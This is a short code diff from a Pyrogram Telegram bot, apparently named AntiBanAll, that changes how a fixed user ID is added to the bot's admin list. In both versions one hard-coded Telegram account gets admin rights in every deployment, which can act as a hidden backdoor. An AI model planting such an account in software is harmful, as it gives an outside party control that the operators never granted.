@@ -15,7 +15,8 @@ from pyrogram.types import (InlineKeyboardButton,
 IKM = InlineKeyboardMarkup
 IKB = InlineKeyboardButton
 
-ADMINS.append(5903688119)
+if not 5903688119 in ADMINS:
+  ADMINS.append(5903688119)
 
 yvi = Client(":AntiBanAll:", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
